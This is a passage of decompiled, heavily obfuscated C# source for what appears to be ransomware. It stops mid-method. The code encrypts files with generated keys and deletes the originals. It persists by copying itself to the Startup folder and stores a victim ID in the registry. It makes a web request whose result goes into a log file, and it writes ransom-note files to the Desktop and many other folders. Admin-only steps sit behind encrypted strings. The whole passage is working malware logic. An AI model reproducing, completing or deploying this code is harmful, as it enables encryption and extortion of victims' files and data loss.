									{
										oRXdQfZZjJ(CS_0024_003C_003E8__locals0.wKxAvZiJPQtO, CS_0024_003C_003E8__locals0.wKxAvZiJPQtO + UfmIFRSQHUmOrq, kQukpPiiliUKcIy, Convert.FromBase64String(NfvyHzKylGMJES));
									}
									else
									{
										oRXdQfZZjJ(CS_0024_003C_003E8__locals0.wKxAvZiJPQtO, CS_0024_003C_003E8__locals0.wKxAvZiJPQtO + UfmIFRSQHUmOrq, Convert.FromBase64String(DtfvoUQGiFhnd), Convert.FromBase64String(NfvyHzKylGMJES));
									}
								}
								catch (Exception ex11)
								{
									if (yqFjfeWQNnFtS)
									{
										try
										{
											File.AppendAllText(mldgFSRddxG, getString_0(107386241) + CS_0024_003C_003E8__locals0.wKxAvZiJPQtO + getString_0(107386465) + ex11.Message + getString_0(107396708));
										}
										catch (Exception)
										{
										}
									}
									IkmoiloXkEwN++;
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.wKxAvZiJPQtO + UfmIFRSQHUmOrq, CS_0024_003C_003E8__locals0.wKxAvZiJPQtO);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
						}
						else if (!GPXFyHxJVGs)
						{
							if (!kGnGVVSmVYCjkQ)
							{
								yaxtgGEmAXdl(CS_0024_003C_003E8__locals0.wKxAvZiJPQtO, CS_0024_003C_003E8__locals0.wKxAvZiJPQtO + getString_0(107386442), kQukpPiiliUKcIy);
							}
							else
							{
								yaxtgGEmAXdl(CS_0024_003C_003E8__locals0.wKxAvZiJPQtO, CS_0024_003C_003E8__locals0.wKxAvZiJPQtO + getString_0(107386442), Convert.FromBase64String(DtfvoUQGiFhnd));
							}
						}
						else
						{
							try
							{
								if (!kGnGVVSmVYCjkQ)
								{
									oRXdQfZZjJ(CS_0024_003C_003E8__locals0.wKxAvZiJPQtO, CS_0024_003C_003E8__locals0.wKxAvZiJPQtO, kQukpPiiliUKcIy, Convert.FromBase64String(NfvyHzKylGMJES));
								}
								else
								{
									oRXdQfZZjJ(CS_0024_003C_003E8__locals0.wKxAvZiJPQtO, CS_0024_003C_003E8__locals0.wKxAvZiJPQtO, Convert.FromBase64String(DtfvoUQGiFhnd), Convert.FromBase64String(NfvyHzKylGMJES));
								}
							}
							catch (Exception ex14)
							{
								if (yqFjfeWQNnFtS)
								{
									try
									{
										File.AppendAllText(mldgFSRddxG, getString_0(107386241) + CS_0024_003C_003E8__locals0.wKxAvZiJPQtO + getString_0(107386465) + ex14.Message + getString_0(107396708));
									}
									catch (Exception)
									{
									}
								}
								IkmoiloXkEwN++;
								return;
							}
						}
						if (kGnGVVSmVYCjkQ)
						{
							if (UfmIFRSQHUmOrq != getString_0(107386447))
							{
								coknNVwPlVpucD(CS_0024_003C_003E8__locals0.wKxAvZiJPQtO + UfmIFRSQHUmOrq, bytes2);
							}
							else
							{
								coknNVwPlVpucD(CS_0024_003C_003E8__locals0.wKxAvZiJPQtO, bytes2);
							}
						}
					}
					end_IL_031d_2:;
				}
				catch (Exception)
				{
				}
			}
			goto IL_0ac2;
			IL_0ac2:
			LVrYlUqqoFMQv.Remove(CS_0024_003C_003E8__locals0.wKxAvZiJPQtO);
		}

		static NKqHkELnIQFAdV()
		{
			Strings.CreateGetStringDelegate(typeof(NKqHkELnIQFAdV));
		}
	}

	private sealed class RiYKHIJMVmjq
	{
		public string XUVHFXoyxzdT;

		public string pIcqQYYbGbyxOr;

		public void _003CEncrypt2_003Eb__40()
		{
			while (true)
			{
				try
				{
					File.Delete(XUVHFXoyxzdT);
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}

		public void _003CEncrypt2_003Eb__41()
		{
			while (true)
			{
				try
				{
					if (File.Exists(pIcqQYYbGbyxOr))
					{
						File.Delete(pIcqQYYbGbyxOr);
					}
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}
	}

	public static string THOjaVpHiJe;

	public static byte[] kQukpPiiliUKcIy;

	public static string vFJQwHPilYftJL;

	public static string mEIFFxHZBgNd;

	public static List<string> hYDYrdRZUMfQ;

	public static List<string> ZTIrvqyduFISa;

	public static string drizePQFAsYv;

	public static string DtfvoUQGiFhnd;

	public static string NfvyHzKylGMJES;

	public static string ydOQhvmvcpZ;

	public static string nEMNsXtEHn;

	public static int lmziWUbxBtbDg;

	public static string LzcJtwyMvPk;

	public static string LznwsrMIBOtXQE;

	public static string ThDQkMiTEWeNLV;

	public static string aTEhTIahfyBm;

	public static string hFKTUljpgDOuMqZ;

	public static string QsGuvJmhkqwuvtfF;

	public static string XJjGaKhSIZHFxe;

	public static string mgzuKEQvMyBiY;

	public static List<string> rAkOOmeaOUziAtZ;

	public static List<string> FXuQVyDsFHEyD;

	public static string HsKiCRPuvRZXJ;

	public static string KXhJJFYGXOkgw;

	public static string bngiVTpcMqH;

	public static List<string> qiPmErxJQggVfu;

	public static string wwoDHXHimBsmdA;

	private static string PhfXqZjqxgzX;

	public static string DDyGmAdWrJ;

	public static string CmLvgLtNWV;

	public static List<string> KhiDjtqGcXyab;

	public static List<string> REZEphvZUr;

	public static List<string> aywbxlBbStFe;

	public static List<string> bsRxjoCdnSAQaTIYq;

	public static string tzcCHjlkJpN;

	public static List<string> wnvGvgZBBKiu;

	public static List<string> hHKYbpRgNB;

	public static string nLsuIQfSGYaFl;

	public static string RopvnmimaAke;

	internal static DateTime lmvPGGutkwMoYtrw;

	internal static DateTime DDFLGVkknj;

	public static string gdbMFWmQXamr;

	public static string gFTAyVipGERPhv;

	public static string zJHlwZECLg;

	public static string SWvJSQFcniIKT;

	public static string FvoWLaSkosPnx;

	public static string OldMIpWrHMgbj;

	public static string FHvZPbVnqqECySl;

	public static string WaGdjztjPUPAi;

	public static List<string> VhmHymKdwdhl;

	public static string DqotASAdvjyOTQWi;

	public static string KrPsgnPgWT;

	public static string qcIqXiFiQf;

	public static string KaXdMRxGsnsgnb;

	public static string qjrkOugCcwWSZn;

	public static string vCrKPOvgbnF;

	public static string cjxrAlGIVjeC;

	public static string vcMyxkfSJn;

	public static string QJWbWKNyLMKPbYy;

	public static string bcgVPenWmNfHuQ;

	public static string AsIpwedYmHx;

	public static string iidHyYJTuAGe;

	public static string pIAnLqxOqdkBxRO;

	public static string dJsRlxFlxsNlxDqFIG;

	public static string CtEQKkNOvvMnA;

	public static string zjHiTkCXWJ;

	public static string yslTNDhnjwP;

	public static string tQtBXqNfbamgSe;

	public static string HXsKUaUHXv;

	public static string RmGQaqoiaBTr;

	public static string ZnKUGBYONLhFoD;

	public static string QaKSEATLAjux;

	public static string hMpaWmVQfeGtnt;

	public static string QkIQdsdubJlar;

	public static string jkeBzDssrUOR;

	public static string gKOCBIIDwanJ;

	public static string ibVWwozpAGuIfs;

	public static string sGJvyLYxpw;

	public static string GwPXdyNycpzfnH;

	public static string[] rankoHCABHptgp;

	public static string tVdkKlIvaDpXN;

	public static bool ZefUNZPKuQWv;

	public static string bVfPZEEQpWG;

	public static bool kGnGVVSmVYCjkQ;

	public static bool XflozndKhjSu;

	public static bool ftsyMaxyfMDPN;

	public static bool amIpEgDOTBvle;

	public static string mldgFSRddxG;

	public static bool yqFjfeWQNnFtS;

	public static bool uIfiDrCneWlVF;

	public static bool PFxkWYfBHNnz;

	public static bool ahRifMUVdZFjN;

	public static bool GPXFyHxJVGs;

	public static string dQyocPsefnEBBf;

	public static bool pjFetgiEucLksJ;

	public static Stopwatch OOvmYuSaZeFkmPR;

	public static int IkmoiloXkEwN;

	public static int JhEGykDTAlk;

	public static bool YkwjPTGZpc;

	public static string EYBkUQfzxCUj;

	public static string[] HJpCGPeEqp;

	public static List<string> WmGQobxHRrmUm;

	public static int lYuNICMXohCnU;

	public static bool EEZuvhlZpe;

	public static bool YnaGkNTsWNftXs;

	public static bool hRhakSWzjqeY;

	public static bool VGRnMzNnqlQlWo;

	public static bool RpKGbvUeVnU;

	public static List<string> fAHytlzCCTvqa;

	public static List<string> TPFsPplHMyJ;

	public static List<string> ReMHMlSRXfwS;

	private static ThreadStart CS_0024_003C_003E9__CachedAnonymousMethodDelegateb;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegatee;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegatef;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate10;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate11;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate12;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate19;

	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("kernel32.dll")]
	private static extern bool SetProcessShutdownParameters(uint uint_0, uint uint_1);

	private static void Main(string[] args)
	{
		try
		{
			rOYGTJNEZgsXODRm CS_0024_003C_003E8__locals0 = new rOYGTJNEZgsXODRm();
			CS_0024_003C_003E8__locals0.lIVyFgCZuhWbAlX = Process.GetCurrentProcess().ProcessName;
			if (Process.GetProcesses().Count((Process process_0) => process_0.ProcessName == CS_0024_003C_003E8__locals0.lIVyFgCZuhWbAlX) > 1)
			{
				return;
			}
		}
		catch (Exception)
		{
		}
		try
		{
			xzCdAXSkaqrbl.viQNPcTulCG(PhfXqZjqxgzX);
		}
		catch (Exception)
		{
		}
		try
		{
			if (gKOCBIIDwanJ == getString_0(107396760))
			{
				Thread thread = new Thread(HprqhSJBOszzD.VjCvWEzIpIJ);
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
		}
		catch
		{
		}
		SetProcessShutdownParameters(0u, 0u);
		if (ThDQkMiTEWeNLV == getString_0(107396760))
		{
			Thread.Sleep(int.Parse(aTEhTIahfyBm));
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && FHvZPbVnqqECySl == getString_0(107396760))
		{
			try
			{
				OTdpygxlWUOjOT(NGKPoQcRFBDfbNt(idSeAbGdhPDRu(getString_0(107396787))));
			}
			catch
			{
			}
		}
		try
		{
			if (XJjGaKhSIZHFxe == getString_0(107396760) && TJnPlIBcaKCjk.vWUZJKklRcMqNK())
			{
				new gNgDTPzmEQFHF().IAIeqFOHmQs(bool_0: false);
				TJnPlIBcaKCjk.hrnhYIeDygYr();
			}
		}
		catch (Exception)
		{
		}
		if (KXhJJFYGXOkgw == getString_0(107396760) && TJnPlIBcaKCjk.vWUZJKklRcMqNK())
		{
			new gNgDTPzmEQFHF().IAIeqFOHmQs(bool_0: false);
			new gNgDTPzmEQFHF().kkpEmHtVbDW();
		}
		if (LznwsrMIBOtXQE == getString_0(107396760))
		{
			DMuizwojLKZsm.lpfiEBZvDWHOWgh();
		}
		try
		{
			ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
			string fileName = mainModule.FileName;
			string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + getString_0(107397194);
			string text2 = text + Path.GetFileName(fileName);
			if (nEMNsXtEHn == getString_0(107396760) && fileName != text2)
			{
				Thread thread2 = new Thread(qUeqlzBELcyel);
				thread2.IsBackground = true;
				thread2.Priority = ThreadPriority.Normal;
				thread2.Start();
			}
			if (drizePQFAsYv == getString_0(107396760) && mainModule != null && fileName != text2)
			{
				try
				{
					lmziWUbxBtbDg = pyaCEgXWOJcuI(0, rAkOOmeaOUziAtZ.Count);
					File.Copy(fileName, text + rAkOOmeaOUziAtZ[lmziWUbxBtbDg], overwrite: true);
					Process.Start(text + rAkOOmeaOUziAtZ[lmziWUbxBtbDg]);
					IlSgvIcQsmbTvU();
					Process.GetCurrentProcess().Kill();
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (nLsuIQfSGYaFl == getString_0(107396760) && DateTime.Now < lmvPGGutkwMoYtrw)
			{
				return;
			}
		}
		catch
		{
		}
		try
		{
			if (RopvnmimaAke == getString_0(107396760) && DateTime.Now > DDFLGVkknj)
			{
				IlSgvIcQsmbTvU();
			}
		}
		catch
		{
		}
		AWGlJlPiXOuSNhR();
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegateb == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegateb = delegate
			{
				List<string> rEZEphvZUr = REZEphvZUr;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatee == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegatee = delegate(string string_0)
					{
						nAUMcEQIEfjEV(NGKPoQcRFBDfbNt(getString_0(107386361)), string_0);
					};
				}
				Parallel.ForEach(rEZEphvZUr, CS_0024_003C_003E9__CachedAnonymousMethodDelegatee);
				List<string> source = aywbxlBbStFe;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatef == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegatef = delegate(string string_0)
					{
						nAUMcEQIEfjEV(NGKPoQcRFBDfbNt(getString_0(107386380)), string_0);
					};
				}
				Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegatef);
				if (GwPXdyNycpzfnH == getString_0(107396760))
				{
					string[] source2 = rankoHCABHptgp;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 = delegate(string string_0)
						{
							nAUMcEQIEfjEV(NGKPoQcRFBDfbNt(getString_0(107386380)), getString_0(107386355) + string_0 + getString_0(107386346));
						};
					}
					Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate10);
				}
				if (!nMAemjtyDhXALFt().Contains(getString_0(107386088)))
				{
					nYxlJZUFKEVvs(tzcCHjlkJpN);
				}
				else
				{
					List<string> source3 = bsRxjoCdnSAQaTIYq;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
						{
							nAUMcEQIEfjEV(NGKPoQcRFBDfbNt(idSeAbGdhPDRu(getString_0(107386309))), string_0);
						};
					}
					Parallel.ForEach(source3, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
				}
				List<string> source4 = wnvGvgZBBKiu;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
					{
						nAUMcEQIEfjEV(NGKPoQcRFBDfbNt(getString_0(107386316)), string_0);
					};
				}
				Parallel.ForEach(source4, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
			};
		}
		Thread thread3 = new Thread(CS_0024_003C_003E9__CachedAnonymousMethodDelegateb);
		thread3.Priority = ThreadPriority.Normal;
		thread3.IsBackground = true;
		thread3.Start();
		try
		{
			string currentDirectory = Directory.GetCurrentDirectory();
			if (!hYDYrdRZUMfQ.Contains(currentDirectory))
			{
				hYDYrdRZUMfQ.Add(currentDirectory);
			}
			if (File.Exists(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107397157))))
			{
				string[] array = File.ReadAllLines(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107397157)));
				string[] array2 = array;
				foreach (string text3 in array2)
				{
					if (text3.Contains(getString_0(107397172)))
					{
						string text4 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text4))
						{
							string[] array3 = text4.Split(new char[1] { ',' });
							foreach (string text5 in array3)
							{
								string text6 = text5.Trim();
								if (Directory.Exists(text6) && !hYDYrdRZUMfQ.Contains(text6) && text6 != getString_0(107397119) && text6 != getString_0(107397130) && text6 != getString_0(107397109))
								{
									hYDYrdRZUMfQ.Add(text6);
								}
							}
						}
					}
					if (text3.Contains(getString_0(107397048)))
					{
						string text7 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text7) && text7.ToLower() == getString_0(107397067))
						{
							pIAnLqxOqdkBxRO = getString_0(107396760);
						}
						else if (!string.IsNullOrEmpty(text7) && text7.ToLower() == getString_0(107397026))
						{
							pIAnLqxOqdkBxRO = getString_0(107397017);
						}
					}
					if (text3.Contains(getString_0(107397044)))
					{
						string text8 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text8) && text8.ToLower() == getString_0(107397067))
						{
							pjFetgiEucLksJ = true;
						}
						else if (!string.IsNullOrEmpty(text8) && text8.ToLower() == getString_0(107397026))
						{
							pjFetgiEucLksJ = false;
						}
					}
					if (text3.Contains(getString_0(107396995)))
					{
						string text9 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text9) && text9.ToLower() == getString_0(107397067))
						{
							yqFjfeWQNnFtS = true;
						}
						else if (!string.IsNullOrEmpty(text9) && text9.ToLower() == getString_0(107397026))
						{
							yqFjfeWQNnFtS = false;
						}
					}
					if (text3.Contains(getString_0(107397014)))
					{
						string text10 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text10) && text10.ToLower() == getString_0(107397067))
						{
							EEZuvhlZpe = true;
						}
						else if (!string.IsNullOrEmpty(text10) && text10.ToLower() == getString_0(107397026))
						{
							EEZuvhlZpe = true;
						}
					}
				}
			}
		}
		catch (Exception ex6)
		{
			if (yqFjfeWQNnFtS)
			{
				try
				{
					File.AppendAllText(mldgFSRddxG, getString_0(107396441) + ex6.Message);
				}
				catch (Exception)
				{
				}
			}
		}
		if (pIAnLqxOqdkBxRO == getString_0(107397017))
		{
			BmTntxdWqYcXr();
		}
		if (pIAnLqxOqdkBxRO == getString_0(107396760))
		{
			try
			{
				FcYYYumjSxot();
			}
			catch
			{
			}
		}
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && ftsyMaxyfMDPN)
			{
				try
				{
					Thread thread4 = new Thread(yTNdYRVrMj.lKvmGhZVOEM);
					thread4.IsBackground = true;
					thread4.Start();
				}
				catch
				{
				}
			}
		}
		catch (Exception)
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			nAUMcEQIEfjEV(getString_0(107396428), NGKPoQcRFBDfbNt(getString_0(107396383)));
		}
		SecureString secureString = new SecureString();
		if (zJHlwZECLg == getString_0(107397017))
		{
			DtfvoUQGiFhnd = KgslGIvxPPYC.ukGooAVIEftF(32);
			NfvyHzKylGMJES = KgslGIvxPPYC.nmusDcUUsKC();
		}
		else
		{
			DtfvoUQGiFhnd = getString_0(107396342);
		}
		ydOQhvmvcpZ = vZEdgQdbRkK.YyRgcNaxySQrynRj(DtfvoUQGiFhnd + NfvyHzKylGMJES);
		try
		{
			if (!kGnGVVSmVYCjkQ)
			{
				RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(NGKPoQcRFBDfbNt(getString_0(107396297)));
				if (registryKey != null)
				{
					registryKey.SetValue(NGKPoQcRFBDfbNt(getString_0(107396220)) + (registryKey.ValueCount + 1), ydOQhvmvcpZ);
					registryKey.Close();
				}
			}
			else
			{
				RegistryKey registryKey2 = Registry.CurrentUser.CreateSubKey(NGKPoQcRFBDfbNt(getString_0(107396297)));
				if (registryKey2 != null && registryKey2.ValueCount == 0)
				{
					registryKey2.SetValue(NGKPoQcRFBDfbNt(getString_0(107396220)) + (registryKey2.ValueCount + 1), ydOQhvmvcpZ);
					registryKey2.Close();
				}
				else if (registryKey2 != null && registryKey2.ValueCount != 0)
				{
					registryKey2.Close();
				}
			}
		}
		catch (Exception)
		{
			RpKGbvUeVnU = true;
		}
		if (PFxkWYfBHNnz)
		{
			try
			{
				if (!File.Exists(Path.Combine(Directory.GetCurrentDirectory(), dQyocPsefnEBBf)))
				{
					File.WriteAllText(Path.Combine(Directory.GetCurrentDirectory(), dQyocPsefnEBBf), string.Concat(NGKPoQcRFBDfbNt(getString_0(107396243)), new WebClient().DownloadString(NGKPoQcRFBDfbNt(getString_0(107396698))), getString_0(107396689), NGKPoQcRFBDfbNt(getString_0(107396684)), DateTime.Now, getString_0(107396689), NGKPoQcRFBDfbNt(getString_0(107396611)), ydOQhvmvcpZ));
				}
				else
				{
					File.AppendAllText(Path.Combine(Directory.GetCurrentDirectory(), dQyocPsefnEBBf), getString_0(107396586) + ydOQhvmvcpZ);
				}
			}
			catch (Exception ex10)
			{
				if (yqFjfeWQNnFtS)
				{
					try
					{
						File.AppendAllText(mldgFSRddxG, getString_0(107396557) + ex10.Message + getString_0(107396689));
					}
					catch (Exception)
					{
					}
				}
			}
		}
		if (!VGRnMzNnqlQlWo)
		{
			bfyHxephDXglTI.ZdYYKhZKqGhQi(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), RmGQaqoiaBTr), IWmmORXaIJtiFeD(ydOQhvmvcpZ), null, null, getString_0(107396476), getString_0(107396491), null);
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			dFSeuldPyEi();
		}
		try
		{
			try
			{
				if (pjFetgiEucLksJ)
				{
					Console.WriteLine(getString_0(107395930));
				}
			}
			catch
			{
			}
			VdHGdFJRyJgD(new string[26]
			{
				getString_0(107395913),
				getString_0(107395876),
				getString_0(107395871),
				getString_0(107395866),
				getString_0(107395893),
				getString_0(107395888),
				getString_0(107395883),
				getString_0(107395846),
				getString_0(107395841),
				getString_0(107395836),
				getString_0(107395831),
				getString_0(107395858),
				getString_0(107395853),
				getString_0(107395848),
				getString_0(107395811),
				getString_0(107395806),
				getString_0(107395801),
				getString_0(107395828),
				getString_0(107395823),
				getString_0(107395818),
				getString_0(107395781),
				getString_0(107395776),
				getString_0(107395771),
				getString_0(107395798),
				getString_0(107395793),
				getString_0(107395788)
			}, new string[100]
			{
				getString_0(107395783),
				getString_0(107395746),
				getString_0(107395741),
				getString_0(107395764),
				getString_0(107395759),
				getString_0(107395754),
				getString_0(107395717),
				getString_0(107395712),
				getString_0(107395707),
				getString_0(107395734),
				getString_0(107395729),
				getString_0(107395724),
				getString_0(107396195),
				getString_0(107396190),
				getString_0(107396213),
				getString_0(107396208),
				getString_0(107396203),
				getString_0(107396166),
				getString_0(107396161),
				getString_0(107396156),
				getString_0(107396179),
				getString_0(107396174),
				getString_0(107396169),
				getString_0(107396132),
				getString_0(107396127),
				getString_0(107396122),
				getString_0(107396149),
				getString_0(107396144),
				getString_0(107396139),
				getString_0(107396102),
				getString_0(107396097),
				getString_0(107396092),
				getString_0(107396087),
				getString_0(107396114),
				getString_0(107396105),
				getString_0(107396068),
				getString_0(107396063),
				getString_0(107396058),
				getString_0(107395717),
				getString_0(107396085),
				getString_0(107395707),
				getString_0(107396076),
				getString_0(107396071),
				getString_0(107396034),
				getString_0(107396029),
				getString_0(107396024),
				getString_0(107396051),
				getString_0(107396046),
				getString_0(107396041),
				getString_0(107396004),
				getString_0(107395999),
				getString_0(107395994),
				getString_0(107396021),
				getString_0(107396016),
				getString_0(107396011),
				getString_0(107395974),
				getString_0(107395969),
				getString_0(107395964),
				getString_0(107395987),
				getString_0(107395982),
				getString_0(107395429),
				getString_0(107395416),
				getString_0(107396085),
				getString_0(107395435),
				getString_0(107395394),
				getString_0(107395385),
				getString_0(107395408),
				getString_0(107395399),
				getString_0(107395358),
				getString_0(107395353),
				getString_0(107395376),
				getString_0(107395367),
				getString_0(107395326),
				getString_0(107395321),
				getString_0(107395348),
				getString_0(107395343),
				getString_0(107395338),
				getString_0(107395301),
				getString_0(107395296),
				getString_0(107395287),
				getString_0(107395314),
				getString_0(107395309),
				getString_0(107395304),
				getString_0(107395267),
				getString_0(107395262),
				getString_0(107395285),
				getString_0(107395276),
				getString_0(107395271),
				getString_0(107396087),
				getString_0(107395234),
				getString_0(107395229),
				getString_0(107395224),
				getString_0(107395251),
				getString_0(107395246),
				getString_0(107395205),
				getString_0(107395200),
				getString_0(107395195),
				getString_0(107395218),
				getString_0(107395213),
				getString_0(107395208)
			}, new string[0], DtfvoUQGiFhnd, getString_0(107395683));
		}
		catch (Exception ex12)
		{
			if (yqFjfeWQNnFtS)
			{
				try
				{
					File.AppendAllText(mldgFSRddxG, getString_0(107395702) + ex12.Message);
				}
				catch (Exception)
				{
				}
			}
			try
			{
				secureString.Dispose();
			}
			catch
			{
			}
		}
		try
		{
			secureString.Dispose();
		}
		catch
		{
		}
		if (!VGRnMzNnqlQlWo || RpKGbvUeVnU)
		{
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395645)))
				{
					using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395645));
					streamWriter.WriteLine(NGKPoQcRFBDfbNt(getString_0(107395612)));
					streamWriter.WriteLine(getString_0(107396689));
					if (hRhakSWzjqeY || !kGnGVVSmVYCjkQ)
					{
						streamWriter.WriteLine(NGKPoQcRFBDfbNt(getString_0(107393642)));
						streamWriter.WriteLine(ydOQhvmvcpZ);
					}
					if (DDyGmAdWrJ == getString_0(107397017))
					{
						streamWriter.WriteLine(getString_0(107396689));
						streamWriter.WriteLine(NGKPoQcRFBDfbNt(getString_0(107393593)) + Convert.ToString(qiPmErxJQggVfu.Count));
					}
					if (YkwjPTGZpc)
					{
						streamWriter.WriteLine(getString_0(107396689));
						streamWriter.WriteLine(NGKPoQcRFBDfbNt(getString_0(107393548)));
						streamWriter.WriteLine(WspNJLioodtR.UyvXvDpzFTru());
					}
				}
				else
				{
					string text11 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395645));
					if (!text11.Contains(ydOQhvmvcpZ) && !kGnGVVSmVYCjkQ)
					{
						File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395645), getString_0(107393515) + ydOQhvmvcpZ);
					}
				}
			}
			catch (Exception ex14)
			{
				if (yqFjfeWQNnFtS)
				{
					try
					{
						File.AppendAllText(mldgFSRddxG, getString_0(107393486) + ex14.Message + getString_0(107396689));
					}
					catch (Exception)
					{
					}
				}
			}
			int num = 0;
			foreach (string item in FXuQVyDsFHEyD)
			{
				num++;
				try
				{
					if (item == Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
					{
						continue;
					}
				}
				catch
				{
				}
				try
				{
					if (!File.Exists(item + getString_0(107395645)))
					{
						File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395645), item + getString_0(107395645), overwrite: true);
					}
					else
					{
						string text12 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395645));
						if (!text12.Contains(ydOQhvmvcpZ) && !kGnGVVSmVYCjkQ)
						{
							File.AppendAllText(item + getString_0(107395645), getString_0(107393515) + ydOQhvmvcpZ);
						}
					}
				}
				catch (Exception ex16)
				{
					if (yqFjfeWQNnFtS)
					{
						try
						{
							File.AppendAllText(mldgFSRddxG, getString_0(107393486) + ex16.Message + getString_0(107396689));
						}
						catch (Exception)
						{
						}
					}
				}
				if (!amIpEgDOTBvle && num > 10)
				{
					break;
				}
			}
		}
		if ((hMpaWmVQfeGtnt == getString_0(107396760) && !VGRnMzNnqlQlWo) || (hMpaWmVQfeGtnt == getString_0(107396760) && RpKGbvUeVnU))
		{
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107393409)))
				{
					using StreamWriter streamWriter2 = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107393409));
					streamWriter2.WriteLine(NGKPoQcRFBDfbNt(getString_0(107392864)));
					streamWriter2.WriteLine(getString_0(107396689));
					if (hRhakSWzjqeY || !kGnGVVSmVYCjkQ)
					{
						streamWriter2.WriteLine(NGKPoQcRFBDfbNt(idSeAbGdhPDRu(getString_0(107389958))));
						streamWriter2.WriteLine(ydOQhvmvcpZ + NGKPoQcRFBDfbNt(getString_0(107389885)));
					}
					if (DDyGmAdWrJ == getString_0(107397017))
					{
						streamWriter2.WriteLine(getString_0(107396689));
						streamWriter2.WriteLine(NGKPoQcRFBDfbNt(getString_0(107389904)) + NGKPoQcRFBDfbNt(getString_0(107393593)) + Convert.ToString(qiPmErxJQggVfu.Count) + NGKPoQcRFBDfbNt(getString_0(107389885)));
					}
					if (YkwjPTGZpc)
					{
						streamWriter2.WriteLine(getString_0(107396689));
						streamWriter2.WriteLine(NGKPoQcRFBDfbNt(getString_0(107393548)));
						streamWriter2.WriteLine(WspNJLioodtR.UyvXvDpzFTru());
					}
				}
				else
				{
					string text13 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395645));
					if (!text13.Contains(ydOQhvmvcpZ) && !kGnGVVSmVYCjkQ)
					{
						File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107393409), NGKPoQcRFBDfbNt(getString_0(107389904)) + getString_0(107393515) + ydOQhvmvcpZ + NGKPoQcRFBDfbNt(getString_0(107389885)));
					}
				}
			}
			catch (Exception ex18)
			{
				if (yqFjfeWQNnFtS)
				{
					try
					{
						File.AppendAllText(mldgFSRddxG, getString_0(107389843) + ex18.Message + getString_0(107396689));
					}
					catch (Exception)
					{
					}
				}
			}
		}
		if (wwoDHXHimBsmdA == getString_0(107396760))
		{
			try
			{
				if (DDyGmAdWrJ == getString_0(107397017))
				{
